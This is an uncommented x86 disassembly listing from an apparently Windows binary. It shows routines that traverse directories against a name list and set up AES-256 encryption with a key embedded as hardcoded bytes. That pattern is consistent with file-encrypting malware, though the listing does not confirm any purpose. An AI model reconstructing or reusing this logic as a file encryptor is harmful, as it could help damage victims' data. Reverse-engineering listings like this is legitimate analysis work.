  40236a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402370:	66 8b 10             	mov    (%eax),%dx
  402373:	83 c0 02             	add    $0x2,%eax
  402376:	66 85 d2             	test   %dx,%dx
  402379:	75 f5                	jne    0x402370
  40237b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40237e:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402382:	2b c1                	sub    %ecx,%eax
  402384:	d1 f8                	sar    $1,%eax
  402386:	83 e8 01             	sub    $0x1,%eax
  402389:	85 f6                	test   %esi,%esi
  40238b:	89 44 24 14          	mov    %eax,0x14(%esp)
  40238f:	75 2b                	jne    0x4023bc
  402391:	8d 87 09 01 00 00    	lea    0x109(%edi),%eax
  402397:	03 c0                	add    %eax,%eax
  402399:	0f 84 27 02 00 00    	je     0x4025c6
  40239f:	50                   	push   %eax
  4023a0:	56                   	push   %esi
  4023a1:	ff 15 90 80 40 00    	call   *0x408090
  4023a7:	50                   	push   %eax
  4023a8:	ff 15 84 80 40 00    	call   *0x408084
  4023ae:	85 c0                	test   %eax,%eax
  4023b0:	89 44 24 10          	mov    %eax,0x10(%esp)
  4023b4:	8b f0                	mov    %eax,%esi
  4023b6:	0f 84 28 02 00 00    	je     0x4025e4
  4023bc:	f6 44 24 20 10       	testb  $0x10,0x20(%esp)
  4023c1:	0f 84 c1 00 00 00    	je     0x402488
  4023c7:	8b 15 3c b2 41 00    	mov    0x41b23c,%edx
  4023cd:	8b 1a                	mov    (%edx),%ebx
  4023cf:	85 db                	test   %ebx,%ebx
  4023d1:	74 5d                	je     0x402430
  4023d3:	8b 3b                	mov    (%ebx),%edi
  4023d5:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  4023d9:	8b c2                	mov    %edx,%eax
  4023db:	2b f8                	sub    %eax,%edi
  4023dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4023e0:	0f b7 04 17          	movzwl (%edi,%edx,1),%eax
  4023e4:	66 3d 41 00          	cmp    $0x41,%ax
  4023e8:	72 09                	jb     0x4023f3
  4023ea:	66 3d 5a 00          	cmp    $0x5a,%ax
  4023ee:	77 03                	ja     0x4023f3
  4023f0:	83 c0 20             	add    $0x20,%eax
  4023f3:	0f b7 c8             	movzwl %ax,%ecx
  4023f6:	0f b7 02             	movzwl (%edx),%eax
  4023f9:	66 3d 41 00          	cmp    $0x41,%ax
  4023fd:	72 09                	jb     0x402408
  4023ff:	66 3d 5a 00          	cmp    $0x5a,%ax
  402403:	77 03                	ja     0x402408
  402405:	83 c0 20             	add    $0x20,%eax
  402408:	83 c2 02             	add    $0x2,%edx
  40240b:	66 85 c9             	test   %cx,%cx
  40240e:	0f b7 c0             	movzwl %ax,%eax
  402411:	74 05                	je     0x402418
  402413:	66 3b c8             	cmp    %ax,%cx
  402416:	74 c8                	je     0x4023e0
  402418:	0f b7 d0             	movzwl %ax,%edx
  40241b:	0f b7 c1             	movzwl %cx,%eax
  40241e:	2b c2                	sub    %edx,%eax
  402420:	0f 84 86 01 00 00    	je     0x4025ac
  402426:	8b 5b 04             	mov    0x4(%ebx),%ebx
  402429:	85 db                	test   %ebx,%ebx
  40242b:	75 a6                	jne    0x4023d3
  40242d:	8b 7d 10             	mov    0x10(%ebp),%edi
  402430:	8b 55 0c             	mov    0xc(%ebp),%edx
  402433:	81 c7 09 01 00 00    	add    $0x109,%edi
  402439:	8b de                	mov    %esi,%ebx
  40243b:	e8 f0 1a 00 00       	call   0x403f30
  402440:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402443:	8d 5c 4e fe          	lea    -0x2(%esi,%ecx,2),%ebx
  402447:	ba d8 81 40 00       	mov    $0x4081d8,%edx
  40244c:	bf 0a 01 00 00       	mov    $0x10a,%edi
  402451:	e8 da 1a 00 00       	call   0x403f30
  402456:	8b 55 10             	mov    0x10(%ebp),%edx
  402459:	8d 1c 56             	lea    (%esi,%edx,2),%ebx
  40245c:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  402460:	bf 09 01 00 00       	mov    $0x109,%edi
  402465:	e8 c6 1a 00 00       	call   0x403f30
  40246a:	8b 44 24 14          	mov    0x14(%esp),%eax
  40246e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  402471:	8d 54 08 01          	lea    0x1(%eax,%ecx,1),%edx
  402475:	8b 45 08             	mov    0x8(%ebp),%eax
  402478:	52                   	push   %edx
  402479:	56                   	push   %esi
  40247a:	50                   	push   %eax
  40247b:	e8 90 fd ff ff       	call   0x402210
  402480:	83 c4 0c             	add    $0xc,%esp
  402483:	e9 0e 01 00 00       	jmp    0x402596
  402488:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  40248c:	e8 bf fc ff ff       	call   0x402150
  402491:	84 c0                	test   %al,%al
  402493:	0f 84 13 01 00 00    	je     0x4025ac
  402499:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40249c:	80 79 20 00          	cmpb   $0x0,0x20(%ecx)
  4024a0:	0f 85 a5 00 00 00    	jne    0x40254b
  4024a6:	8b 54 24 14          	mov    0x14(%esp),%edx
  4024aa:	03 d7                	add    %edi,%edx
  4024ac:	81 fa fa 00 00 00    	cmp    $0xfa,%edx
  4024b2:	0f 82 93 00 00 00    	jb     0x40254b
  4024b8:	8b 15 70 b2 41 00    	mov    0x41b270,%edx
  4024be:	c6 44 24 0f 00       	movb   $0x0,0xf(%esp)
  4024c3:	81 c7 09 01 00 00    	add    $0x109,%edi
  4024c9:	8b de                	mov    %esi,%ebx
  4024cb:	e8 60 1a 00 00       	call   0x403f30
  4024d0:	8a 44 24 0f          	mov    0xf(%esp),%al
  4024d4:	84 c0                	test   %al,%al
  4024d6:	75 12                	jne    0x4024ea
  4024d8:	8b 55 0c             	mov    0xc(%ebp),%edx
  4024db:	83 c7 fc             	add    $0xfffffffc,%edi
  4024de:	8d 5e 08             	lea    0x8(%esi),%ebx
  4024e1:	e8 4a 1a 00 00       	call   0x403f30
  4024e6:	8a 44 24 0f          	mov    0xf(%esp),%al
  4024ea:	8a c8                	mov    %al,%cl
  4024ec:	8b 54 24 10          	mov    0x10(%esp),%edx
  4024f0:	f6 d9                	neg    %cl
  4024f2:	1b c9                	sbb    %ecx,%ecx
  4024f4:	83 e1 04             	and    $0x4,%ecx
  4024f7:	f6 d8                	neg    %al
  4024f9:	8b f1                	mov    %ecx,%esi
  4024fb:	8d be 06 01 00 00    	lea    0x106(%esi),%edi
  402501:	1b c0                	sbb    %eax,%eax
  402503:	83 e0 fc             	and    $0xfffffffc,%eax
  402506:	83 c0 04             	add    $0x4,%eax
  402509:	03 45 10             	add    0x10(%ebp),%eax
  40250c:	8d 04 42             	lea    (%edx,%eax,2),%eax
  40250f:	89 44 24 14          	mov    %eax,0x14(%esp)
  402513:	8d 58 fe             	lea    -0x2(%eax),%ebx
  402516:	b8 d8 81 40 00       	mov    $0x4081d8,%eax
  40251b:	e8 40 1a 00 00       	call   0x403f60
  402520:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402524:	8d be 05 01 00 00    	lea    0x105(%esi),%edi
  40252a:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  40252e:	e8 2d 1a 00 00       	call   0x403f60
  402533:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  402537:	85 c9                	test   %ecx,%ecx
  402539:	8b 74 24 40          	mov    0x40(%esp),%esi
  40253d:	8b 45 08             	mov    0x8(%ebp),%eax
  402540:	77 16                	ja     0x402558
  402542:	3b 70 14             	cmp    0x14(%eax),%esi
  402545:	77 11                	ja     0x402558
  402547:	b2 01                	mov    $0x1,%dl
  402549:	eb 0f                	jmp    0x40255a
  40254b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40254e:	c6 44 24 0f 01       	movb   $0x1,0xf(%esp)
  402553:	e9 6b ff ff ff       	jmp    0x4024c3
  402558:	32 d2                	xor    %dl,%dl
  40255a:	88 50 22             	mov    %dl,0x22(%eax)
  40255d:	8b 54 24 20          	mov    0x20(%esp),%edx
  402561:	bb 01 00 00 00       	mov    $0x1,%ebx
  402566:	84 d3                	test   %dl,%bl
  402568:	74 08                	je     0x402572
  40256a:	88 58 23             	mov    %bl,0x23(%eax)
  40256d:	89 50 24             	mov    %edx,0x24(%eax)
  402570:	eb 04                	jmp    0x402576
  402572:	c6 40 23 00          	movb   $0x0,0x23(%eax)
  402576:	50                   	push   %eax
  402577:	89 48 1c             	mov    %ecx,0x1c(%eax)
  40257a:	89 70 18             	mov    %esi,0x18(%eax)
  40257d:	8b 44 24 14          	mov    0x14(%esp),%eax
  402581:	50                   	push   %eax
  402582:	e8 d9 0d 00 00       	call   0x403360
  402587:	8b 74 24 18          	mov    0x18(%esp),%esi
  40258b:	83 c4 08             	add    $0x8,%esp
  40258e:	3a c3                	cmp    %bl,%al
  402590:	75 04                	jne    0x402596
  402592:	01 5c 24 18          	add    %ebx,0x18(%esp)
  402596:	a1 0c 90 40 00       	mov    0x40900c,%eax
  40259b:	85 c0                	test   %eax,%eax
  40259d:	74 0d                	je     0x4025ac
  40259f:	6a 00                	push   $0x0
  4025a1:	50                   	push   %eax
  4025a2:	ff 15 10 81 40 00    	call   *0x408110
  4025a8:	85 c0                	test   %eax,%eax
  4025aa:	74 28                	je     0x4025d4
  4025ac:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4025b0:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4025b4:	51                   	push   %ecx
  4025b5:	52                   	push   %edx
  4025b6:	ff 15 20 81 40 00    	call   *0x408120
  4025bc:	85 c0                	test   %eax,%eax
  4025be:	0f 85 6c fd ff ff    	jne    0x402330
  4025c4:	eb 1e                	jmp    0x4025e4
  4025c6:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4025cd:	00 
  4025ce:	8b 74 24 10          	mov    0x10(%esp),%esi
  4025d2:	eb 10                	jmp    0x4025e4
  4025d4:	56                   	push   %esi
  4025d5:	6a 00                	push   $0x0
  4025d7:	ff 15 90 80 40 00    	call   *0x408090
  4025dd:	50                   	push   %eax
  4025de:	ff 15 8c 80 40 00    	call   *0x40808c
  4025e4:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  4025e9:	7e 08                	jle    0x4025f3
  4025eb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4025ee:	e8 0d 51 00 00       	call   0x407700
  4025f3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4025f7:	50                   	push   %eax
  4025f8:	ff 15 00 81 40 00    	call   *0x408100
  4025fe:	56                   	push   %esi
  4025ff:	6a 00                	push   $0x0
  402601:	ff 15 90 80 40 00    	call   *0x408090
  402607:	50                   	push   %eax
  402608:	ff 15 8c 80 40 00    	call   *0x40808c
  40260e:	5f                   	pop    %edi
  40260f:	5e                   	pop    %esi
  402610:	5b                   	pop    %ebx
  402611:	8b e5                	mov    %ebp,%esp
  402613:	5d                   	pop    %ebp
  402614:	c3                   	ret
  402615:	cc                   	int3
  402616:	cc                   	int3
  402617:	cc                   	int3
  402618:	cc                   	int3
  402619:	cc                   	int3
  40261a:	cc                   	int3
  40261b:	cc                   	int3
  40261c:	cc                   	int3
  40261d:	cc                   	int3
  40261e:	cc                   	int3
  40261f:	cc                   	int3
  402620:	56                   	push   %esi
  402621:	8b 74 24 08          	mov    0x8(%esp),%esi
  402625:	0f b6 46 21          	movzbl 0x21(%esi),%eax
  402629:	8b 4e 04             	mov    0x4(%esi),%ecx
  40262c:	50                   	push   %eax
  40262d:	51                   	push   %ecx
  40262e:	e8 fd f9 ff ff       	call   0x402030
  402633:	83 c4 08             	add    $0x8,%esp
  402636:	84 c0                	test   %al,%al
  402638:	75 30                	jne    0x40266a
  40263a:	8b 56 04             	mov    0x4(%esi),%edx
  40263d:	52                   	push   %edx
  40263e:	e8 8d 3f 00 00       	call   0x4065d0
  402643:	8b 4e 04             	mov    0x4(%esi),%ecx
  402646:	83 c4 04             	add    $0x4,%esp
  402649:	8b c1                	mov    %ecx,%eax
  40264b:	eb 03                	jmp    0x402650
  40264d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402650:	66 8b 10             	mov    (%eax),%dx
  402653:	83 c0 02             	add    $0x2,%eax
  402656:	66 85 d2             	test   %dx,%dx
  402659:	75 f5                	jne    0x402650
  40265b:	2b c1                	sub    %ecx,%eax
  40265d:	d1 f8                	sar    $1,%eax
  40265f:	50                   	push   %eax
  402660:	51                   	push   %ecx
  402661:	56                   	push   %esi
  402662:	e8 a9 fb ff ff       	call   0x402210
  402667:	83 c4 0c             	add    $0xc,%esp
  40266a:	b8 01 00 00 00       	mov    $0x1,%eax
  40266f:	5e                   	pop    %esi
  402670:	c2 04 00             	ret    $0x4
  402673:	cc                   	int3
  402674:	cc                   	int3
  402675:	cc                   	int3
  402676:	cc                   	int3
  402677:	cc                   	int3
  402678:	cc                   	int3
  402679:	cc                   	int3
  40267a:	cc                   	int3
  40267b:	cc                   	int3
  40267c:	cc                   	int3
  40267d:	cc                   	int3
  40267e:	cc                   	int3
  40267f:	cc                   	int3
  402680:	51                   	push   %ecx
  402681:	8d 46 0c             	lea    0xc(%esi),%eax
  402684:	50                   	push   %eax
  402685:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40268b:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402692:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402699:	ff 15 40 81 40 00    	call   *0x408140
  40269f:	68 00 00 00 f0       	push   $0xf0000000
  4026a4:	6a 18                	push   $0x18
  4026a6:	6a 00                	push   $0x0
  4026a8:	6a 00                	push   $0x0
  4026aa:	56                   	push   %esi
  4026ab:	ff 15 28 80 40 00    	call   *0x408028
  4026b1:	85 c0                	test   %eax,%eax
  4026b3:	75 02                	jne    0x4026b7
  4026b5:	89 06                	mov    %eax,(%esi)
  4026b7:	8d 4e 28             	lea    0x28(%esi),%ecx
  4026ba:	51                   	push   %ecx
  4026bb:	6a 0a                	push   $0xa
  4026bd:	8b c6                	mov    %esi,%eax
  4026bf:	c7 46 08 00 c0 41 00 	movl   $0x41c000,0x8(%esi)
  4026c6:	e8 85 02 00 00       	call   0x402950
  4026cb:	89 46 24             	mov    %eax,0x24(%esi)
  4026ce:	8b c6                	mov    %esi,%eax
  4026d0:	59                   	pop    %ecx
  4026d1:	c3                   	ret
  4026d2:	cc                   	int3
  4026d3:	cc                   	int3
  4026d4:	cc                   	int3
  4026d5:	cc                   	int3
  4026d6:	cc                   	int3
  4026d7:	cc                   	int3
  4026d8:	cc                   	int3
  4026d9:	cc                   	int3
  4026da:	cc                   	int3
  4026db:	cc                   	int3
  4026dc:	cc                   	int3
  4026dd:	cc                   	int3
  4026de:	cc                   	int3
  4026df:	cc                   	int3
  4026e0:	57                   	push   %edi
  4026e1:	8b 3d 80 b2 41 00    	mov    0x41b280,%edi
  4026e7:	83 3f 00             	cmpl   $0x0,(%edi)
  4026ea:	75 1a                	jne    0x402706
  4026ec:	68 00 00 00 f0       	push   $0xf0000000
  4026f1:	6a 18                	push   $0x18
  4026f3:	6a 00                	push   $0x0
  4026f5:	6a 00                	push   $0x0
  4026f7:	57                   	push   %edi
  4026f8:	ff 15 28 80 40 00    	call   *0x408028
  4026fe:	85 c0                	test   %eax,%eax
  402700:	75 04                	jne    0x402706
  402702:	89 07                	mov    %eax,(%edi)
  402704:	5f                   	pop    %edi
  402705:	c3                   	ret
  402706:	56                   	push   %esi
  402707:	6a 10                	push   $0x10
  402709:	6a 00                	push   $0x0
  40270b:	ff 15 90 80 40 00    	call   *0x408090
  402711:	50                   	push   %eax
  402712:	ff 15 84 80 40 00    	call   *0x408084
  402718:	8b f0                	mov    %eax,%esi
  40271a:	85 f6                	test   %esi,%esi
  40271c:	75 03                	jne    0x402721
  40271e:	5e                   	pop    %esi
  40271f:	5f                   	pop    %edi
  402720:	c3                   	ret
  402721:	6a 10                	push   $0x10
  402723:	6a 00                	push   $0x0
  402725:	56                   	push   %esi
  402726:	e8 d5 e9 ff ff       	call   0x401100
  40272b:	8b 07                	mov    (%edi),%eax
  40272d:	83 c4 0c             	add    $0xc,%esp
  402730:	56                   	push   %esi
  402731:	6a 10                	push   $0x10
  402733:	50                   	push   %eax
  402734:	ff 15 00 80 40 00    	call   *0x408000
  40273a:	f7 d8                	neg    %eax
  40273c:	1b c0                	sbb    %eax,%eax
  40273e:	23 c6                	and    %esi,%eax
  402740:	5e                   	pop    %esi
  402741:	5f                   	pop    %edi
  402742:	c3                   	ret
  402743:	cc                   	int3
  402744:	cc                   	int3
  402745:	cc                   	int3
  402746:	cc                   	int3
  402747:	cc                   	int3
  402748:	cc                   	int3
  402749:	cc                   	int3
  40274a:	cc                   	int3
  40274b:	cc                   	int3
  40274c:	cc                   	int3
  40274d:	cc                   	int3
  40274e:	cc                   	int3
  40274f:	cc                   	int3
  402750:	83 ec 08             	sub    $0x8,%esp
  402753:	56                   	push   %esi
  402754:	8b 35 80 b2 41 00    	mov    0x41b280,%esi
  40275a:	83 3e 00             	cmpl   $0x0,(%esi)
  40275d:	75 21                	jne    0x402780
  40275f:	68 00 00 00 f0       	push   $0xf0000000
  402764:	6a 18                	push   $0x18
  402766:	6a 00                	push   $0x0
  402768:	6a 00                	push   $0x0
  40276a:	56                   	push   %esi
  40276b:	ff 15 28 80 40 00    	call   *0x408028
  402771:	85 c0                	test   %eax,%eax
  402773:	75 0b                	jne    0x402780
  402775:	89 06                	mov    %eax,(%esi)
  402777:	32 c0                	xor    %al,%al
  402779:	5e                   	pop    %esi
  40277a:	83 c4 08             	add    $0x8,%esp
  40277d:	c2 04 00             	ret    $0x4
  402780:	8b 4e 28             	mov    0x28(%esi),%ecx
  402783:	8b 56 24             	mov    0x24(%esi),%edx
  402786:	8d 44 24 04          	lea    0x4(%esp),%eax
  40278a:	50                   	push   %eax
  40278b:	8b 06                	mov    (%esi),%eax
  40278d:	6a 00                	push   $0x0
  40278f:	6a 00                	push   $0x0
  402791:	51                   	push   %ecx
  402792:	52                   	push   %edx
  402793:	50                   	push   %eax
  402794:	ff 15 34 80 40 00    	call   *0x408034
  40279a:	85 c0                	test   %eax,%eax
  40279c:	75 0f                	jne    0x4027ad
  40279e:	ff 15 04 81 40 00    	call   *0x408104
  4027a4:	32 c0                	xor    %al,%al
  4027a6:	5e                   	pop    %esi
  4027a7:	83 c4 08             	add    $0x8,%esp
  4027aa:	c2 04 00             	ret    $0x4
  4027ad:	8b 54 24 10          	mov    0x10(%esp),%edx
  4027b1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4027b5:	68 80 00 00 00       	push   $0x80
  4027ba:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4027be:	51                   	push   %ecx
  4027bf:	52                   	push   %edx
  4027c0:	6a 00                	push   $0x0
  4027c2:	6a 00                	push   $0x0
  4027c4:	6a 00                	push   $0x0
  4027c6:	50                   	push   %eax
  4027c7:	c7 44 24 24 75 00 00 	movl   $0x75,0x24(%esp)
  4027ce:	00 
  4027cf:	ff 15 38 80 40 00    	call   *0x408038
  4027d5:	85 c0                	test   %eax,%eax
  4027d7:	75 1a                	jne    0x4027f3
  4027d9:	ff 15 04 81 40 00    	call   *0x408104
  4027df:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4027e3:	51                   	push   %ecx
  4027e4:	ff 15 24 80 40 00    	call   *0x408024
  4027ea:	32 c0                	xor    %al,%al
  4027ec:	5e                   	pop    %esi
  4027ed:	83 c4 08             	add    $0x8,%esp
  4027f0:	c2 04 00             	ret    $0x4
  4027f3:	8b 54 24 04          	mov    0x4(%esp),%edx
  4027f7:	52                   	push   %edx
  4027f8:	ff 15 24 80 40 00    	call   *0x408024
  4027fe:	85 c0                	test   %eax,%eax
  402800:	74 9c                	je     0x40279e
  402802:	b0 01                	mov    $0x1,%al
  402804:	5e                   	pop    %esi
  402805:	83 c4 08             	add    $0x8,%esp
  402808:	c2 04 00             	ret    $0x4
  40280b:	cc                   	int3
  40280c:	cc                   	int3
  40280d:	cc                   	int3
  40280e:	cc                   	int3
  40280f:	cc                   	int3
  402810:	83 ec 4c             	sub    $0x4c,%esp
  402813:	83 3e 00             	cmpl   $0x0,(%esi)
  402816:	b0 0b                	mov    $0xb,%al
  402818:	b1 56                	mov    $0x56,%cl
  40281a:	88 44 24 10          	mov    %al,0x10(%esp)
  40281e:	88 44 24 18          	mov    %al,0x18(%esp)
  402822:	b0 25                	mov    $0x25,%al
  402824:	88 0c 24             	mov    %cl,(%esp)
  402827:	c6 44 24 01 35       	movb   $0x35,0x1(%esp)
  40282c:	c6 44 24 02 8a       	movb   $0x8a,0x2(%esp)
  402831:	c6 44 24 03 66       	movb   $0x66,0x3(%esp)
  402836:	c6 44 24 04 a0       	movb   $0xa0,0x4(%esp)
  40283b:	c6 44 24 05 42       	movb   $0x42,0x5(%esp)
  402840:	c6 44 24 06 99       	movb   $0x99,0x6(%esp)
  402845:	c6 44 24 07 7c       	movb   $0x7c,0x7(%esp)
  40284a:	c6 44 24 08 ba       	movb   $0xba,0x8(%esp)
  40284f:	c6 44 24 09 2d       	movb   $0x2d,0x9(%esp)
  402854:	c6 44 24 0a 5c       	movb   $0x5c,0xa(%esp)
  402859:	c6 44 24 0b 4c       	movb   $0x4c,0xb(%esp)
  40285e:	c6 44 24 0c db       	movb   $0xdb,0xc(%esp)
  402863:	c6 44 24 0d 48       	movb   $0x48,0xd(%esp)
  402868:	c6 44 24 0e 77       	movb   $0x77,0xe(%esp)
  40286d:	c6 44 24 0f da       	movb   $0xda,0xf(%esp)
  402872:	c6 44 24 11 23       	movb   $0x23,0x11(%esp)
  402877:	c6 44 24 12 05       	movb   $0x5,0x12(%esp)
  40287c:	c6 44 24 13 dd       	movb   $0xdd,0x13(%esp)
  402881:	c6 44 24 14 94       	movb   $0x94,0x14(%esp)
  402886:	88 4c 24 15          	mov    %cl,0x15(%esp)
  40288a:	c6 44 24 16 d2       	movb   $0xd2,0x16(%esp)
  40288f:	c6 44 24 17 b3       	movb   $0xb3,0x17(%esp)
  402894:	c6 44 24 19 a8       	movb   $0xa8,0x19(%esp)
  402899:	c6 44 24 1a 4b       	movb   $0x4b,0x1a(%esp)
  40289e:	c6 44 24 1b 9b       	movb   $0x9b,0x1b(%esp)
  4028a3:	88 44 24 1c          	mov    %al,0x1c(%esp)
  4028a7:	c6 44 24 1d bf       	movb   $0xbf,0x1d(%esp)
  4028ac:	c6 44 24 1e 45       	movb   $0x45,0x1e(%esp)
  4028b1:	88 44 24 1f          	mov    %al,0x1f(%esp)
  4028b5:	75 1e                	jne    0x4028d5
  4028b7:	68 00 00 00 f0       	push   $0xf0000000
  4028bc:	6a 18                	push   $0x18
  4028be:	6a 00                	push   $0x0
  4028c0:	6a 00                	push   $0x0
  4028c2:	56                   	push   %esi
  4028c3:	ff 15 28 80 40 00    	call   *0x408028
  4028c9:	85 c0                	test   %eax,%eax
  4028cb:	75 08                	jne    0x4028d5
  4028cd:	89 06                	mov    %eax,(%esi)
  4028cf:	32 c0                	xor    %al,%al
  4028d1:	83 c4 4c             	add    $0x4c,%esp
  4028d4:	c3                   	ret
  4028d5:	6a 2c                	push   $0x2c
  4028d7:	8d 44 24 24          	lea    0x24(%esp),%eax
  4028db:	6a 00                	push   $0x0
  4028dd:	50                   	push   %eax
  4028de:	e8 1d e8 ff ff       	call   0x401100
  4028e3:	6a 20                	push   $0x20
  4028e5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4028e9:	51                   	push   %ecx
  4028ea:	8d 54 24 40          	lea    0x40(%esp),%edx
  4028ee:	52                   	push   %edx
  4028ef:	66 c7 44 24 38 08 02 	movw   $0x208,0x38(%esp)
  4028f6:	66 c7 44 24 3c 10 66 	movw   $0x6610,0x3c(%esp)
  4028fd:	c6 44 24 40 20       	movb   $0x20,0x40(%esp)
  402902:	e8 39 e8 ff ff       	call   0x401140
  402907:	8b 16                	mov    (%esi),%edx
  402909:	83 c4 18             	add    $0x18,%esp
  40290c:	8d 46 04             	lea    0x4(%esi),%eax
  40290f:	50                   	push   %eax
  402910:	6a 00                	push   $0x0
  402912:	6a 00                	push   $0x0
  402914:	6a 2c                	push   $0x2c
  402916:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  40291a:	51                   	push   %ecx
  40291b:	52                   	push   %edx
  40291c:	ff 15 34 80 40 00    	call   *0x408034
  402922:	85 c0                	test   %eax,%eax
  402924:	75 15                	jne    0x40293b
  402926:	ff 15 04 81 40 00    	call   *0x408104
  40292c:	50                   	push   %eax
  40292d:	e8 9e 3c 00 00       	call   0x4065d0
  402932:	83 c4 04             	add    $0x4,%esp
  402935:	32 c0                	xor    %al,%al
  402937:	83 c4 4c             	add    $0x4c,%esp
  40293a:	c3                   	ret
  40293b:	b0 01                	mov    $0x1,%al
  40293d:	83 c4 4c             	add    $0x4c,%esp
  402940:	c3                   	ret
  402941:	cc                   	int3
  402942:	cc                   	int3
  402943:	cc                   	int3
  402944:	cc                   	int3
  402945:	cc                   	int3
  402946:	cc                   	int3
  402947:	cc                   	int3
  402948:	cc                   	int3
  402949:	cc                   	int3
  40294a:	cc                   	int3
  40294b:	cc                   	int3
  40294c:	cc                   	int3
  40294d:	cc                   	int3
  40294e:	cc                   	int3
  40294f:	cc                   	int3
  402950:	83 ec 0c             	sub    $0xc,%esp
  402953:	53                   	push   %ebx
  402954:	55                   	push   %ebp
  402955:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  402959:	56                   	push   %esi
  40295a:	8b f0                	mov    %eax,%esi
  40295c:	8b 46 08             	mov    0x8(%esi),%eax
  40295f:	85 c0                	test   %eax,%eax
  402961:	57                   	push   %edi
  402962:	74 33                	je     0x402997
  402964:	8b 18                	mov    (%eax),%ebx
  402966:	33 ff                	xor    %edi,%edi
  402968:	85 db                	test   %ebx,%ebx
  40296a:	76 2b                	jbe    0x402997
  40296c:	8d 64 24 00          	lea    0x0(%esp),%esp
  402970:	8b 46 08             	mov    0x8(%esi),%eax
  402973:	6a 08                	push   $0x8
  402975:	8d 4c f8 08          	lea    0x8(%eax,%edi,8),%ecx
  402979:	51                   	push   %ecx
  40297a:	8d 54 24 18          	lea    0x18(%esp),%edx
  40297e:	52                   	push   %edx
  40297f:	e8 bc e7 ff ff       	call   0x401140
  402984:	0f b7 44 24 1c       	movzwl 0x1c(%esp),%eax
  402989:	83 c4 0c             	add    $0xc,%esp
  40298c:	3b c5                	cmp    %ebp,%eax
  40298e:	74 13                	je     0x4029a3
  402990:	83 c7 01             	add    $0x1,%edi
  402993:	3b fb                	cmp    %ebx,%edi
  402995:	72 d9                	jb     0x402970
  402997:	33 c0                	xor    %eax,%eax
  402999:	5f                   	pop    %edi
  40299a:	5e                   	pop    %esi
  40299b:	5d                   	pop    %ebp
  40299c:	5b                   	pop    %ebx
  40299d:	83 c4 0c             	add    $0xc,%esp
  4029a0:	c2 08 00             	ret    $0x8
  4029a3:	8b 4e 08             	mov    0x8(%esi),%ecx
  4029a6:	6a 08                	push   $0x8
  4029a8:	8d 54 f9 08          	lea    0x8(%ecx,%edi,8),%edx
  4029ac:	52                   	push   %edx
  4029ad:	8d 44 24 18          	lea    0x18(%esp),%eax
  4029b1:	50                   	push   %eax
  4029b2:	e8 89 e7 ff ff       	call   0x401140
  4029b7:	66 8b 44 24 20       	mov    0x20(%esp),%ax
  4029bc:	66 8b 4c 24 1e       	mov    0x1e(%esp),%cx
  4029c1:	83 c4 0c             	add    $0xc,%esp
  4029c4:	66 3b c1             	cmp    %cx,%ax
  4029c7:	76 ce                	jbe    0x402997
  4029c9:	0f b7 c9             	movzwl %cx,%ecx
  4029cc:	0f b7 f8             	movzwl %ax,%edi
  4029cf:	2b f9                	sub    %ecx,%edi
  4029d1:	74 c4                	je     0x402997
  4029d3:	57                   	push   %edi
  4029d4:	6a 00                	push   $0x0
  4029d6:	ff 15 90 80 40 00    	call   *0x408090
  4029dc:	50                   	push   %eax
  4029dd:	ff 15 84 80 40 00    	call   *0x408084
  4029e3:	8b d8                	mov    %eax,%ebx
  4029e5:	85 db                	test   %ebx,%ebx
  4029e7:	74 ae                	je     0x402997
  4029e9:	0f b7 54 24 12       	movzwl 0x12(%esp),%edx
  4029ee:	03 56 08             	add    0x8(%esi),%edx
  4029f1:	57                   	push   %edi
  4029f2:	52                   	push   %edx
  4029f3:	53                   	push   %ebx
  4029f4:	e8 47 e7 ff ff       	call   0x401140
  4029f9:	83 c4 0c             	add    $0xc,%esp
  4029fc:	8d 6e 0c             	lea    0xc(%esi),%ebp
  4029ff:	55                   	push   %ebp
  402a00:	ff 15 44 81 40 00    	call   *0x408144
  402a06:	e8 05 fe ff ff       	call   0x402810
  402a0b:	84 c0                	test   %al,%al
  402a0d:	74 88                	je     0x402997
  402a0f:	8b 44 24 24          	mov    0x24(%esp),%eax
  402a13:	50                   	push   %eax
  402a14:	53                   	push   %ebx
  402a15:	6a 00                	push   $0x0
  402a17:	6a 00                	push   $0x0
  402a19:	89 38                	mov    %edi,(%eax)
  402a1b:	8b 46 04             	mov    0x4(%esi),%eax
  402a1e:	6a 00                	push   $0x0
  402a20:	50                   	push   %eax
  402a21:	ff 15 20 80 40 00    	call   *0x408020
  402a27:	85 c0                	test   %eax,%eax
  402a29:	75 1b                	jne    0x402a46
  402a2b:	ff 15 04 81 40 00    	call   *0x408104
  402a31:	50                   	push   %eax
  402a32:	e8 99 3b 00 00       	call   0x4065d0
  402a37:	83 c4 04             	add    $0x4,%esp
  402a3a:	33 c0                	xor    %eax,%eax
  402a3c:	5f                   	pop    %edi
  402a3d:	5e                   	pop    %esi
  402a3e:	5d                   	pop    %ebp
  402a3f:	5b                   	pop    %ebx
  402a40:	83 c4 0c             	add    $0xc,%esp
  402a43:	c2 08 00             	ret    $0x8
